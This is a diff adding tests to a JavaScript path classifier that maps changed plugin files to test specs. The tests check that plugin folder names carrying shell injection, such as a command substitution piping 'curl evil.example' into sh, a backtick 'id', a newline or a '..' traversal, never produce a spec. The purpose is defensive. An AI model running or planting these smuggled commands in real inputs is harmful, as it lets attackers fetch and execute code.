@@ -143,6 +143,15 @@ check('newly added plugin ui maps to its own spec', classifyPath('examples/plugi
 check('newly added plugin manifest maps to spec plus plugins settings', classifyPath('examples/plugins/brand-new-plugin/manifest.json'), ['settings-plugins', 'plugin:brand-new-plugin']);
 check('plugin nested ui file maps to its own spec', classifyPath('examples/plugins/repo-custom-fields/ui/lib/widget.js'), 'plugin:repo-custom-fields');
 check('plugin non-ui file is ignored by classifier', classifyPath('examples/plugins/repo-custom-fields/scripts/build.js'), null);
+check('shell-metacharacter plugin slug never becomes a spec', classifyPath('examples/plugins/$(curl${IFS}evil.example|sh)/ui/index.html'), null);
+check('backtick plugin slug never becomes a spec', classifyPath('examples/plugins/`id`/ui/index.html'), null);
+check('newline plugin slug never becomes a spec', classifyPath('examples/plugins/foo\nbar/ui/index.html'), null);
+check('traversal plugin slug never becomes a spec', classifyPath('examples/plugins/foo..bar/ui/index.html'), null);
+check('space plugin slug never becomes a spec', classifyPath('examples/plugins/bad slug/ui/index.html'), null);
+check('malicious plugin manifest maps to nothing at all', mapPathsToScenes([
+  'examples/plugins/$(curl${IFS}evil.example|sh)/manifest.json',
+  'examples/plugins/$(curl${IFS}evil.example|sh)/ui/index.html',
+]), []);
 
 // 5. classifyPath — locales fall back to namespace scope without a key diff
 check('repositories locale fallback covers appearance consumers', classifyPath('src/locales/zh/repositories.json'), ['repositories', 'settings-appearance']);
